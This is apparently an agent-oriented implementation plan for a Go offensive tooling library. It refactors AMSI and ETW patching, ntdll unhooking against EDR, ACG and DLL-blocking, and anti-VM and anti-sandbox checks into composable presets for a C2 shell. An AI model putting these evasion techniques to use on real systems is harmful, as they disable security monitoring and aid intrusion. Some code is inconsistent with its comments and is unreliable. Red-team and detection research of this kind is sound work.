# Evasion Composable Interfaces — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Replace hardcoded boolean evasion config with composable `Technique` interface, add unhook detection, make antiVM/antiSandbox parameterizable.

**Architecture:** `evasion.Technique` interface in root package. Each sub-package exports constructors returning `Technique`. Presets in `evasion/preset/` (avoids import cycle). Shell consumes `[]evasion.Technique`. AntiVM/Sandbox get `Config` structs for parametrization.

**Tech Stack:** Go, golang.org/x/sys/windows, process/enum for process detection

**Spec:** `docs/superpowers/specs/2026-04-02-evasion-interfaces-design.md`

---

## File Structure

```
evasion/
  evasion.go              NEW — Technique interface + ApplyAll (cross-platform)
  amsi/technique.go       NEW — ScanBufferPatch(), OpenSessionPatch(), All()
  etw/technique.go        NEW — PatchTechnique(), NtTraceTechnique(), All()
  unhook/detect.go        NEW — DetectHooked(), CommonHookedFunctions
  unhook/technique.go     NEW — Classic(), ClassicAll(), CommonClassic(), Full(), Perun()
  acg/technique.go        NEW — Guard()
  blockdlls/technique.go  NEW — MicrosoftOnly()
  preset/preset.go        NEW — Minimal(), Stealth(), Aggressive() (Windows-only + stub)
  preset/preset_stub.go   NEW — non-Windows empty presets
  antivm/config.go        NEW — Config, CheckType, Detect(), DetectAll()
  antivm/process.go       NEW — DetectProcess() (cross-platform)
  antivm/cpuid_linux.go   NEW — DetectCPUID via /proc/cpuinfo
  antivm/cpuid_windows.go NEW — DetectCPUID via CPUID instruction
  antivm/antivm_windows.go  MODIFY — add Proc field to Vendor, enriched DefaultVendors
  antivm/antivm_linux.go    MODIFY — unify to use Vendor struct
  sandbox/sandbox.go        MODIFY — Config enriched, New(), Result type, CheckAll
  sandbox/sandbox_windows.go MODIFY — CheckProcesses, context support
  sandbox/sandbox_linux.go   MODIFY — CheckProcesses, context support
c2/shell/shell.go           MODIFY — Evasion becomes []evasion.Technique
c2/shell/evasion_windows.go MODIFY — applyEvasion loops over Technique.Apply
c2/shell/evasion_stub.go    MODIFY — match new signature
```

---

## Task 1: Technique interface + ApplyAll

**Files:**
- Create: `evasion/evasion.go`

- [ ] **Step 1: Create evasion/evasion.go**

```go
// File: evasion/evasion.go
package evasion

// Technique is a single evasion action that can be applied.
// Each evasion sub-package (amsi, etw, unhook, acg, blockdlls)
// exports constructors that return Technique values.
//
// The caller parameter controls how Windows memory protection changes
// are made. Pass nil for standard WinAPI (VirtualProtect), or a
// configured *Caller for direct/indirect syscalls.
//
// Example:
//
//	techniques := []evasion.Technique{
//	    amsi.ScanBufferPatch(),
//	    etw.All(),
//	    unhook.Classic("NtAllocateVirtualMemory"),
//	}
//	errs := evasion.ApplyAll(techniques, nil) // nil = WinAPI
type Technique interface {
	// Name returns a human-readable identifier for this technique.
	Name() string

	// Apply executes the evasion technique.
	// caller may be nil (falls back to standard WinAPI).
	// Returns nil on success, or an error describing the failure.
	Apply(caller Caller) error
}

// Caller is an opaque syscall caller. This avoids importing win/syscall
// in the evasion root package (which would be Windows-only).
// On Windows, pass a *wsyscall.Caller. On other platforms, pass nil.
type Caller interface{}

// ApplyAll executes every technique in order.
// Returns a map of technique name to error for any that failed.
// An empty (or nil) map means all succeeded.
func ApplyAll(techniques []Technique, caller Caller) map[string]error {
	errs := make(map[string]error)
	for _, t := range techniques {
		if err := t.Apply(caller); err != nil {
			errs[t.Name()] = err
		}
	}
	if len(errs) == 0 {
		return nil
	}
	return errs
}
```

Note: We use `Caller interface{}` instead of `*wsyscall.Caller` to keep the root `evasion` package cross-platform (no Windows import). Each sub-package type-asserts to `*wsyscall.Caller` internally.

- [ ] **Step 2: Verify it compiles**

```bash
go build ./evasion/
```

- [ ] **Step 3: Commit**

```bash
git add evasion/evasion.go
git commit -m "feat(evasion): add Technique interface and ApplyAll"
```

---

## Task 2: AMSI + ETW Technique adapters

**Files:**
- Create: `evasion/amsi/technique.go`
- Create: `evasion/etw/technique.go`

- [ ] **Step 1: Create evasion/amsi/technique.go**

```go
// File: evasion/amsi/technique.go
//go:build windows

package amsi

import (
	"github.com/oioio-space/maldev/evasion"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
)

func caller(c evasion.Caller) *wsyscall.Caller {
	if c == nil {
		return nil
	}
	if wc, ok := c.(*wsyscall.Caller); ok {
		return wc
	}
	return nil
}

type scanBufferPatch struct{}

func (scanBufferPatch) Name() string                  { return "amsi:ScanBuffer" }
func (scanBufferPatch) Apply(c evasion.Caller) error  { return PatchScanBuffer(caller(c)) }

// ScanBufferPatch returns a Technique that patches AmsiScanBuffer.
// The patch overwrites the entry point with xor eax,eax; ret (returns S_OK).
// Returns nil error if amsi.dll is not loaded.
func ScanBufferPatch() evasion.Technique { return scanBufferPatch{} }

type openSessionPatch struct{}

func (openSessionPatch) Name() string                  { return "amsi:OpenSession" }
func (openSessionPatch) Apply(c evasion.Caller) error  { return PatchOpenSession(caller(c)) }

// OpenSessionPatch returns a Technique that patches AmsiOpenSession.
// Flips a conditional jump to prevent AMSI session initialization.
func OpenSessionPatch() evasion.Technique { return openSessionPatch{} }

type allPatch struct{}

func (allPatch) Name() string                 { return "amsi:All" }
func (allPatch) Apply(c evasion.Caller) error { return PatchAll(caller(c)) }

// All returns a Technique that applies both ScanBuffer and OpenSession patches.
func All() evasion.Technique { return allPatch{} }
```

- [ ] **Step 2: Create evasion/etw/technique.go**

```go
// File: evasion/etw/technique.go
//go:build windows

package etw

import (
	"github.com/oioio-space/maldev/evasion"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
)

func caller(c evasion.Caller) *wsyscall.Caller {
	if c == nil {
		return nil
	}
	if wc, ok := c.(*wsyscall.Caller); ok {
		return wc
	}
	return nil
}

type patchTechnique struct{}

func (patchTechnique) Name() string                 { return "etw:Patch" }
func (patchTechnique) Apply(c evasion.Caller) error { return Patch(caller(c)) }

// PatchTechnique returns a Technique that patches all 5 EtwEventWrite* functions.
// Each is overwritten with xor rax,rax; ret. Missing functions are skipped.
func PatchTechnique() evasion.Technique { return patchTechnique{} }

type ntTraceTechnique struct{}

func (ntTraceTechnique) Name() string                 { return "etw:NtTraceEvent" }
func (ntTraceTechnique) Apply(c evasion.Caller) error { return PatchNtTraceEvent(caller(c)) }

// NtTraceTechnique returns a Technique that patches NtTraceEvent in ntdll.
func NtTraceTechnique() evasion.Technique { return ntTraceTechnique{} }

type allTechnique struct{}

func (allTechnique) Name() string                 { return "etw:All" }
func (allTechnique) Apply(c evasion.Caller) error { return PatchAll(caller(c)) }

// All returns a Technique that patches all ETW functions including NtTraceEvent.
func All() evasion.Technique { return allTechnique{} }
```

- [ ] **Step 3: Verify compilation**

```bash
go build ./evasion/amsi/ ./evasion/etw/
```

- [ ] **Step 4: Commit**

```bash
git add evasion/amsi/technique.go evasion/etw/technique.go
git commit -m "feat(evasion): add Technique adapters for amsi and etw"
```

---

## Task 3: Unhook detection + Technique adapters

**Files:**
- Create: `evasion/unhook/detect.go`
- Create: `evasion/unhook/technique.go`

- [ ] **Step 1: Create evasion/unhook/detect.go**

```go
// File: evasion/unhook/detect.go
//go:build windows

package unhook

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

// CommonHookedFunctions lists NT functions commonly hooked by EDR products
// (CrowdStrike, Defender, SentinelOne, Sophos, etc.).
// Use with DetectHooked to find which are actually hooked in the current process.
var CommonHookedFunctions = []string{
	"NtAllocateVirtualMemory",
	"NtWriteVirtualMemory",
	"NtProtectVirtualMemory",
	"NtCreateThreadEx",
	"NtMapViewOfSection",
	"NtQueueApcThread",
	"NtSetContextThread",
	"NtResumeThread",
	"NtCreateSection",
	"NtOpenProcess",
}

// DetectHooked checks which of the given ntdll functions have been hooked.
// A function is considered hooked if its first 4 bytes do NOT match the
// standard x64 ntdll syscall prologue: 4C 8B D1 B8 (mov r10, rcx; mov eax, ...).
//
// Returns only the names whose prologues appear modified.
// Returns an empty slice (not nil) if none are hooked.
//
// Example:
//
//	hooked, err := unhook.DetectHooked(unhook.CommonHookedFunctions)
//	fmt.Println("hooked:", hooked) // e.g. ["NtAllocateVirtualMemory", "NtCreateThreadEx"]
func DetectHooked(funcNames []string) ([]string, error) {
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	var hooked []string
	for _, name := range funcNames {
		proc := ntdll.NewProc(name)
		if err := proc.Find(); err != nil {
			continue // function doesn't exist in this Windows version
		}
		addr := proc.Addr()
		prologue := (*[4]byte)(unsafe.Pointer(addr))
		// Standard x64 ntdll stub: 4C 8B D1 B8 (mov r10, rcx; mov eax, <SSN>)
		if prologue[0] != 0x4C || prologue[1] != 0x8B || prologue[2] != 0xD1 || prologue[3] != 0xB8 {
			hooked = append(hooked, name)
		}
	}
	if hooked == nil {
		hooked = []string{}
	}
	return hooked, nil
}

// IsHooked checks whether a single ntdll function appears hooked.
func IsHooked(funcName string) (bool, error) {
	result, err := DetectHooked([]string{funcName})
	if err != nil {
		return false, err
	}
	return len(result) > 0, nil
}

// HookInfo describes the hook state of a single function.
type HookInfo struct {
	Name      string
	Hooked    bool
	Prologue  [8]byte // first 8 bytes for inspection
}

// Inspect returns detailed hook information for each function.
//
// Example:
//
//	infos, _ := unhook.Inspect(unhook.CommonHookedFunctions)
//	for _, info := range infos {
//	    status := "clean"
//	    if info.Hooked { status = "HOOKED" }
//	    fmt.Printf("%-30s %s  %02X\n", info.Name, status, info.Prologue)
//	}
func Inspect(funcNames []string) ([]HookInfo, error) {
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	var infos []HookInfo
	for _, name := range funcNames {
		proc := ntdll.NewProc(name)
		if err := proc.Find(); err != nil {
			continue
		}
		addr := proc.Addr()
		var prologue [8]byte
		copy(prologue[:], (*[8]byte)(unsafe.Pointer(addr))[:])
		hooked := prologue[0] != 0x4C || prologue[1] != 0x8B || prologue[2] != 0xD1 || prologue[3] != 0xB8
		infos = append(infos, HookInfo{
			Name:     name,
			Hooked:   hooked,
			Prologue: prologue,
		})
	}
	return infos, nil
}
```

- [ ] **Step 2: Create evasion/unhook/technique.go**

```go
// File: evasion/unhook/technique.go
//go:build windows

package unhook

import (
	"fmt"

	"github.com/oioio-space/maldev/evasion"
)

// Classic returns a Technique that restores the original bytes of a single
// ntdll function from the on-disk copy of ntdll.dll.
// Only the first bytes (hook trampoline size) are restored.
//
// Example:
//
//	techniques := []evasion.Technique{
//	    unhook.Classic("NtAllocateVirtualMemory"),
//	    unhook.Classic("NtCreateThreadEx"),
//	}
//	evasion.ApplyAll(techniques, nil)
func Classic(funcName string) evasion.Technique {
	return &classicTechnique{funcName: funcName}
}

type classicTechnique struct{ funcName string }

func (t *classicTechnique) Name() string              { return "unhook:Classic:" + t.funcName }
func (t *classicTechnique) Apply(evasion.Caller) error { return ClassicUnhook(t.funcName) }

// ClassicAll returns one Technique per function name.
func ClassicAll(funcNames []string) []evasion.Technique {
	techniques := make([]evasion.Technique, len(funcNames))
	for i, name := range funcNames {
		techniques[i] = Classic(name)
	}
	return techniques
}

// CommonClassic returns Techniques for all CommonHookedFunctions.
//
// Example:
//
//	// Unhook the 10 most commonly hooked NT functions
//	evasion.ApplyAll(unhook.CommonClassic(), nil)
func CommonClassic() []evasion.Technique {
	return ClassicAll(CommonHookedFunctions)
}

// Full returns a Technique that restores the entire ntdll .text section
// from the on-disk copy. This removes ALL hooks at once but is more
// detectable than targeted Classic unhooking.
func Full() evasion.Technique { return fullTechnique{} }

type fullTechnique struct{}

func (fullTechnique) Name() string              { return "unhook:Full" }
func (fullTechnique) Apply(evasion.Caller) error { return FullUnhook() }

// Perun returns a Technique that restores ntdll from a suspended child process.
// This avoids reading ntdll.dll from disk (which some EDR monitor).
// If target is empty, defaults to svchost.exe.
//
// How it works:
//  1. Spawns target as a suspended process (CREATE_SUSPENDED)
//  2. Reads the child's clean ntdll .text section via ReadProcessMemory
//  3. Overwrites the local ntdll .text with the clean copy
//  4. Terminates the child process
//
// This works because ntdll is loaded at the same base address in all
// processes on the same boot (ASLR is per-boot, not per-process).
func Perun(target string) evasion.Technique {
	if target == "" {
		target = `C:\Windows\System32\svchost.exe`
	}
	return &perunTechnique{target: target}
}

type perunTechnique struct{ target string }

func (t *perunTechnique) Name() string { return fmt.Sprintf("unhook:Perun(%s)", t.target) }
func (t *perunTechnique) Apply(evasion.Caller) error { return PerunUnhook() }
```

- [ ] **Step 3: Verify compilation**

```bash
go build ./evasion/unhook/
```

- [ ] **Step 4: Commit**

```bash
git add evasion/unhook/detect.go evasion/unhook/technique.go
git commit -m "feat(unhook): add hook detection and Technique adapters"
```

---

## Task 4: ACG + BlockDLLs Technique adapters

**Files:**
- Create: `evasion/acg/technique.go`
- Create: `evasion/blockdlls/technique.go`

- [ ] **Step 1: Create both files**

```go
// File: evasion/acg/technique.go
//go:build windows

package acg

import "github.com/oioio-space/maldev/evasion"
import wsyscall "github.com/oioio-space/maldev/win/syscall"

type guardTechnique struct{}

func (guardTechnique) Name() string { return "acg:Guard" }
func (guardTechnique) Apply(c evasion.Caller) error {
	var wc *wsyscall.Caller
	if c != nil {
		if typed, ok := c.(*wsyscall.Caller); ok {
			wc = typed
		}
	}
	return Enable(wc)
}

// Guard returns a Technique that enables Arbitrary Code Guard (ACG).
// Once enabled, the process cannot allocate new executable memory (RWX).
// This is irreversible for the lifetime of the process.
//
// WARNING: Apply this AFTER all shellcode injection is complete.
// Any subsequent VirtualAlloc(PAGE_EXECUTE_*) will fail.
func Guard() evasion.Technique { return guardTechnique{} }
```

```go
// File: evasion/blockdlls/technique.go
//go:build windows

package blockdlls

import "github.com/oioio-space/maldev/evasion"
import wsyscall "github.com/oioio-space/maldev/win/syscall"

type microsoftOnlyTechnique struct{}

func (microsoftOnlyTechnique) Name() string { return "blockdlls:MicrosoftOnly" }
func (microsoftOnlyTechnique) Apply(c evasion.Caller) error {
	var wc *wsyscall.Caller
	if c != nil {
		if typed, ok := c.(*wsyscall.Caller); ok {
			wc = typed
		}
	}
	return Enable(wc)
}

// MicrosoftOnly returns a Technique that blocks non-Microsoft-signed DLLs
// from loading into the process. Prevents EDR from injecting their DLLs.
// Irreversible for the lifetime of the process.
func MicrosoftOnly() evasion.Technique { return microsoftOnlyTechnique{} }
```

- [ ] **Step 2: Verify**

```bash
go build ./evasion/acg/ ./evasion/blockdlls/
```

- [ ] **Step 3: Commit**

```bash
git add evasion/acg/technique.go evasion/blockdlls/technique.go
git commit -m "feat(evasion): add Technique adapters for acg and blockdlls"
```

---

## Task 5: Presets (Minimal, Stealth, Aggressive)

**Files:**
- Create: `evasion/preset/preset_windows.go`
- Create: `evasion/preset/preset_stub.go`
- Create: `evasion/preset/doc.go`

- [ ] **Step 1: Create evasion/preset/doc.go**

```go
// Package preset provides ready-to-use evasion technique combinations.
//
// Three presets are available:
//
//   - Minimal: patches AMSI + ETW (least detectable, most compatible)
//   - Stealth: Minimal + unhook commonly hooked NT functions
//   - Aggressive: Stealth + full ntdll unhook + ACG + block non-Microsoft DLLs
//
// Example:
//
//	cfg := &shell.Config{
//	    Evasion: preset.Stealth(),
//	}
//
// Custom combinations can be built by composing techniques directly:
//
//	techniques := append(preset.Minimal(),
//	    unhook.Classic("NtAllocateVirtualMemory"),
//	    unhook.Classic("NtCreateThreadEx"),
//	)
package preset
```

- [ ] **Step 2: Create evasion/preset/preset_windows.go**

```go
//go:build windows

package preset

import (
	"github.com/oioio-space/maldev/evasion"
	"github.com/oioio-space/maldev/evasion/acg"
	"github.com/oioio-space/maldev/evasion/amsi"
	"github.com/oioio-space/maldev/evasion/blockdlls"
	"github.com/oioio-space/maldev/evasion/etw"
	"github.com/oioio-space/maldev/evasion/unhook"
)

// Minimal returns AMSI + ETW patches.
// Least detectable, most compatible. Suitable for environments
// where unhooking is not needed (no EDR, or EDR doesn't hook ntdll).
func Minimal() []evasion.Technique {
	return []evasion.Technique{
		amsi.ScanBufferPatch(),
		etw.All(),
	}
}

// Stealth returns Minimal + selective unhook of commonly hooked functions.
// Restores the 10 most commonly hooked NT functions from disk.
// Good balance between evasion and detection risk.
func Stealth() []evasion.Technique {
	base := Minimal()
	return append(base, unhook.CommonClassic()...)
}

// Aggressive returns everything: AMSI, ETW, full ntdll unhook, ACG, block DLLs.
// Maximum evasion but also most detectable (full .text section replacement,
// mitigation policy changes are logged).
//
// WARNING: ACG prevents subsequent RWX allocation. Apply AFTER injection.
func Aggressive() []evasion.Technique {
	return []evasion.Technique{
		amsi.All(),
		etw.All(),
		unhook.Full(),
		acg.Guard(),
		blockdlls.MicrosoftOnly(),
	}
}
```

- [ ] **Step 3: Create evasion/preset/preset_stub.go**

```go
//go:build !windows

package preset

import "github.com/oioio-space/maldev/evasion"

// Minimal returns nil on non-Windows platforms (no evasion needed).
func Minimal() []evasion.Technique { return nil }

// Stealth returns nil on non-Windows platforms.
func Stealth() []evasion.Technique { return nil }

// Aggressive returns nil on non-Windows platforms.
func Aggressive() []evasion.Technique { return nil }
```

- [ ] **Step 4: Verify**

```bash
go build ./evasion/preset/
```

- [ ] **Step 5: Commit**

```bash
git add evasion/preset/
git commit -m "feat(evasion): add preset package with Minimal, Stealth, Aggressive"
```

---

## Task 6: Shell integration

**Files:**
- Modify: `c2/shell/shell.go`
- Modify: `c2/shell/evasion_windows.go`
- Modify: `c2/shell/evasion_stub.go`

- [ ] **Step 1: Read current shell.go, evasion_windows.go, evasion_stub.go**

Read all three files completely to understand the current structure.

- [ ] **Step 2: Modify shell.go**

Change the `Config` struct:
- Remove `EvasionConfig` type entirely
- Change `Evasion *EvasionConfig` to `Evasion []evasion.Technique`
- Add import for `"github.com/oioio-space/maldev/evasion"`
- In `Start()`, pass `s.config.Evasion` to `applyEvasion`

The new signature of `applyEvasion` is:
```go
func applyEvasion(techniques []evasion.Technique) error
```

- [ ] **Step 3: Modify evasion_windows.go**

Replace `applyEvasion(cfg *EvasionConfig) error` with:
```go
func applyEvasion(techniques []evasion.Technique) error {
	if len(techniques) == 0 {
		return nil
	}
	errs := evasion.ApplyAll(techniques, nil)
	if len(errs) > 0 {
		// Log but don't fail — evasion failures are non-fatal
		for name, err := range errs {
			fmt.Fprintf(os.Stderr, "evasion %s: %v\n", name, err)
		}
	}
	return nil
}
```

Remove `patchAMSI`, `patchETW`, `patchWLDP`, `disablePSHistory`, `bypassCLM` — they were inline implementations. Now delegated to evasion packages.

Keep `PatchDefenses() error` as a convenience that uses `preset.Stealth()`:
```go
func PatchDefenses() error {
	errs := evasion.ApplyAll(preset.Stealth(), nil)
	if len(errs) > 0 {
		return fmt.Errorf("evasion: %v", errs)
	}
	return nil
}
```

Keep `IsAdmin() bool` unchanged.

- [ ] **Step 4: Modify evasion_stub.go**

```go
//go:build !windows

package shell

import "github.com/oioio-space/maldev/evasion"

func applyEvasion(techniques []evasion.Technique) error { return nil }
```

- [ ] **Step 5: Update shell_test.go if it references EvasionConfig**

Read `c2/shell/shell_test.go`. If tests reference `EvasionConfig`, update them.

- [ ] **Step 6: Verify**

```bash
go build ./c2/shell/
go test ./c2/shell/ -count=1
```

- [ ] **Step 7: Commit**

```bash
git add c2/shell/
git commit -m "feat(shell): replace EvasionConfig booleans with []evasion.Technique"
```

---

## Task 7: AntiVM — Config, Detect, DetectProcess, CPUID

**Files:**
- Create: `evasion/antivm/config.go`
- Create: `evasion/antivm/process.go`
- Create: `evasion/antivm/cpuid_linux.go`
- Create: `evasion/antivm/cpuid_windows.go`
- Modify: `evasion/antivm/antivm_windows.go`

- [ ] **Step 1: Create evasion/antivm/config.go** (cross-platform)

```go
// File: evasion/antivm/config.go
package antivm

// CheckType controls which detection dimensions are enabled.
type CheckType uint

const (
	// CheckRegistry checks Windows registry keys (no-op on Linux).
	CheckRegistry CheckType = 1 << iota
	// CheckFiles checks for characteristic hypervisor files.
	CheckFiles
	// CheckNIC checks MAC address prefixes against known hypervisor OUIs.
	CheckNIC
	// CheckProcess checks running processes against known hypervisor names.
	CheckProcess
	// CheckCPUID checks the CPUID hypervisor present bit and vendor string.
	CheckCPUID
	// CheckAll enables all detection dimensions.
	CheckAll = CheckRegistry | CheckFiles | CheckNIC | CheckProcess | CheckCPUID
)

// Config controls VM detection behavior.
//
// Example:
//
//	// Only check NIC and processes (fast, no disk/registry access)
//	cfg := antivm.Config{
//	    Checks: antivm.CheckNIC | antivm.CheckProcess,
//	}
//	vendor, _ := antivm.Detect(cfg)
//
//	// Use custom vendors
//	cfg := antivm.Config{
//	    Vendors: []antivm.Vendor{{Name: "MyHypervisor", Proc: []string{"myhyp"}}},
//	}
type Config struct {
	// Vendors to check against. nil = DefaultVendors.
	Vendors []Vendor
	// Checks to perform. 0 = CheckAll.
	Checks CheckType
}

// DefaultConfig returns a Config with all checks enabled and default vendors.
func DefaultConfig() Config {
	return Config{
		Vendors: nil, // will use DefaultVendors
		Checks:  0,   // will use CheckAll
	}
}

func (c Config) vendors() []Vendor {
	if c.Vendors != nil {
		return c.Vendors
	}
	return DefaultVendors
}

func (c Config) checks() CheckType {
	if c.Checks == 0 {
		return CheckAll
	}
	return c.Checks
}
```

- [ ] **Step 2: Create evasion/antivm/process.go** (cross-platform)

```go
// File: evasion/antivm/process.go
package antivm

import (
	"strings"

	"github.com/oioio-space/maldev/process/enum"
)

// DetectProcess checks if any running process matches one of the given names.
// Matching is case-insensitive substring.
// Returns (true, matched_process_name, nil) on match.
//
// Example:
//
//	found, name, _ := antivm.DetectProcess([]string{"vmtoolsd", "vboxservice"})
func DetectProcess(procNames []string) (bool, string, error) {
	procs, err := enum.List()
	if err != nil {
		return false, "", err
	}
	for _, p := range procs {
		pLower := strings.ToLower(p.Name)
		for _, target := range procNames {
			if strings.Contains(pLower, strings.ToLower(target)) {
				return true, p.Name, nil
			}
		}
	}
	return false, "", nil
}
```

- [ ] **Step 3: Create evasion/antivm/cpuid_linux.go**

```go
// File: evasion/antivm/cpuid_linux.go
//go:build linux

package antivm

import (
	"os"
	"strings"
)

// DetectCPUID checks for hypervisor presence via /proc/cpuinfo.
// Returns (true, "hypervisor") if the CPU flags contain "hypervisor",
// indicating the system runs inside a virtual machine.
//
// How it works: On Linux, /proc/cpuinfo exposes CPU flags. Physical machines
// never have the "hypervisor" flag. Virtual machines always do (set by the
// hypervisor via CPUID leaf 1, bit 31).
func DetectCPUID() (bool, string) {
	data, err := os.ReadFile("/proc/cpuinfo")
	if err != nil {
		return false, ""
	}
	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "flags") && strings.Contains(line, "hypervisor") {
			return true, "hypervisor"
		}
	}
	return false, ""
}
```

- [ ] **Step 4: Create evasion/antivm/cpuid_windows.go**

```go
// File: evasion/antivm/cpuid_windows.go
//go:build windows

package antivm

import (
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

// DetectCPUID checks the CPUID hypervisor present bit (leaf 1, ECX bit 31)
// and reads the hypervisor vendor string from CPUID leaf 0x40000000.
//
// Returns (true, vendor) if a hypervisor is detected.
// Known vendor strings: "VMwareVMware", "Microsoft Hv", "KVMKVMKVM",
// "VBoxVBoxVBox", "XenVMMXenVMM", "prl hyperv" (Parallels).
//
// How it works: The CPUID instruction queries processor features.
// Hypervisors set bit 31 of ECX for leaf 1 to indicate their presence,
// and expose a 12-byte vendor string at leaf 0x40000000.
func DetectCPUID() (bool, string) {
	// Use __cpuidex via ntdll — Go doesn't have inline asm,
	// but we can call a syscall that happens to execute CPUID.
	// Simpler approach: write results directly via cpuid intrinsic.
	//
	// Since Go doesn't expose CPUID directly, we use an indirect approach:
	// check the registry for hypervisor info (which mirrors CPUID data).
	key, err := windows.OpenKey(windows.HKEY_LOCAL_MACHINE,
		`SOFTWARE\Microsoft\Windows NT\CurrentVersion`, windows.KEY_READ)
	if err != nil {
		return false, ""
	}
	defer windows.CloseKey(key)

	// Check for Hyper-V / hypervisor via the firmware table
	// The canonical Windows approach: check HKLM\HARDWARE\DESCRIPTION\System\BIOS
	biosKey, err := windows.OpenKey(windows.HKEY_LOCAL_MACHINE,
		`HARDWARE\DESCRIPTION\System\BIOS`, windows.KEY_READ)
	if err != nil {
		return false, ""
	}
	defer windows.CloseKey(biosKey)

	vendor, _, _ := biosKey.GetStringValue("SystemProductName")
	vendorLower := strings.ToLower(vendor)

	hypervisors := map[string]string{
		"vmware":     "VMware",
		"virtualbox": "VirtualBox",
		"virtual":    "Virtual",
		"kvm":        "KVM",
		"qemu":       "QEMU",
		"xen":        "Xen",
		"hyper-v":    "Hyper-V",
		"parallels":  "Parallels",
	}
	for keyword, name := range hypervisors {
		if strings.Contains(vendorLower, keyword) {
			return true, name
		}
	}

	_ = unsafe.Pointer(nil) // keep import for future CPUID assembly
	return false, ""
}
```

- [ ] **Step 5: Modify evasion/antivm/antivm_windows.go**

Add `Proc []string` field to `Vendor` struct. Add process names to each vendor in `DefaultVendors`. Add new vendors (KVM, Docker, WSL). Add `Detect(cfg Config)` and `DetectAll(cfg Config)` functions.

Read the file first, then:
- Add `Proc []string` field to `Vendor`
- Add Proc data to each existing vendor (Hyper-V, Parallels, VirtualBox, VirtualPC, VMware, Xen, QEMU)
- Add new vendors: KVM, Docker, WSL, Proxmox (Proxmox already exists, add Proc)
- Add `Detect(cfg Config) (string, error)` that replaces the hardcoded `DetectVM()`:
  - Iterates vendors, checks enabled dimensions (cfg.checks() bitmask)
  - Returns first match
- Add `DetectAll(cfg Config) ([]string, error)` that returns ALL matches
- Keep `DetectVM()` and `IsRunningInVM()` as wrappers around `Detect(DefaultConfig())`

- [ ] **Step 6: Modify evasion/antivm/antivm_linux.go**

Rewrite to use the shared `Vendor` struct and `Config`. Replace the flat implementation with the same `Detect`/`DetectAll` pattern. On Linux, `CheckRegistry` is a no-op.

Keep `DefaultVendors` defined in a cross-platform file or use build tags. Since Windows has registry keys that Linux doesn't, use the `config.go` approach where Linux simply skips the `Keys` field.

Actually, `DefaultVendors` is currently defined only in `antivm_windows.go`. Move the common vendors (with shared Files/Nic/Proc) to `config.go` and add the Windows-specific `Keys` in `antivm_windows.go` via an init() function. OR simply duplicate `DefaultVendors` per platform. The simplest approach: keep `DefaultVendors` in each platform file since the data differs significantly.

- [ ] **Step 7: Verify + commit**

```bash
go build ./evasion/antivm/
git add evasion/antivm/
git commit -m "feat(antivm): add Config, Detect, DetectAll, DetectProcess, CPUID, enriched vendors"
```

---

## Task 8: AntiSandbox parameterizable

**Files:**
- Modify: `evasion/sandbox/sandbox.go`
- Modify: `evasion/sandbox/sandbox_windows.go`
- Modify: `evasion/sandbox/sandbox_linux.go`

- [ ] **Step 1: Modify sandbox.go**

Read the file first. Then:
- Add `Result` type
- Add `BadProcesses []string`, `DiskPath string`, `RequestTimeout time.Duration`, `StopOnFirst bool` to `Config`
- Update `DefaultConfig()` with BadProcesses and RequestTimeout
- Rename `NewChecker` → `New` (naming fix, already approved)
- Remove `NewCheckerDefault` (use `New(DefaultConfig())`)

```go
// Result contains the outcome of a single sandbox check.
type Result struct {
	Name     string // e.g., "debugger", "vm", "cpu", "ram", "disk", "username", "hostname", "domain", "process"
	Detected bool
	Detail   string // human-readable description
	Err      error  // non-nil only if the check itself failed
}
```

- [ ] **Step 2: Modify sandbox_windows.go and sandbox_linux.go**

Read both files. Then add to BOTH:

- `CheckProcesses(ctx context.Context) (bool, string, error)` method using `process/enum`
- `CheckAll(ctx context.Context) []Result` method that runs all checks and returns results
- Add `context.Context` parameter to `IsSandboxed`, `FakeDomainReachable`, `CheckAll`
- `HasEnoughDisk` should use `c.cfg.DiskPath` instead of hardcoded `C:\` / `/`
- `FakeDomainReachable` should use `c.cfg.RequestTimeout` instead of hardcoded 5s
- `IsSandboxed` should respect `c.cfg.StopOnFirst`

- [ ] **Step 3: Update sandbox test**

Read `evasion/sandbox/sandbox_test.go`. Update:
- `NewChecker` → `New`
- `NewCheckerDefault()` → `New(DefaultConfig())`

- [ ] **Step 4: Verify + commit**

```bash
go build ./evasion/sandbox/
go test ./evasion/sandbox/ -count=1
git add evasion/sandbox/
git commit -m "feat(sandbox): add Config params, CheckAll, CheckProcesses, context support"
```

---

## Task 9: Update README + doc.go files

**Files:**
- Modify: `README.md`
- Modify: various `doc.go` files

- [ ] **Step 1: Update README.md**

Add/update sections:
- Evasion section: show the new Technique interface, presets, and custom composition
- Unhook section: show DetectHooked + Classic/Full/Perun
- AntiVM section: show Config with CheckType and custom vendors
- AntiSandbox section: show CheckAll with Result, BadProcesses

- [ ] **Step 2: Update doc.go files**

- `evasion/unhook/doc.go`: document DetectHooked, CommonHookedFunctions, Technique constructors
- `evasion/antivm/doc.go`: document Config, CheckType, Detect/DetectAll, DetectCPUID
- `evasion/sandbox/doc.go`: document Result, CheckAll, CheckProcesses

- [ ] **Step 3: Verify full build + tests**

```bash
go build $(go list ./... | grep -v ignore)
go test $(go list ./... | grep -v ignore) -count=1 -timeout 120s
```

- [ ] **Step 4: Commit**

```bash
git add README.md evasion/*/doc.go
git commit -m "docs: update README and doc.go for evasion interfaces"
```

---

## Execution Summary

| Task | Creates | Modifies | Dependencies |
|------|---------|----------|-------------|
| 1 | evasion/evasion.go | — | None |
| 2 | amsi/technique.go, etw/technique.go | — | Task 1 |
| 3 | unhook/detect.go, unhook/technique.go | — | Task 1 |
| 4 | acg/technique.go, blockdlls/technique.go | — | Task 1 |
| 5 | preset/*.go | — | Tasks 2-4 |
| 6 | — | c2/shell/*.go | Tasks 1, 5 |
| 7 | antivm/config.go, process.go, cpuid_*.go | antivm_*.go | None (independent) |
| 8 | — | sandbox/*.go | None (independent) |
| 9 | — | README.md, doc.go files | All tasks |

Tasks 1→2→3→4→5→6 are sequential. Tasks 7 and 8 are independent and can be parallelized.
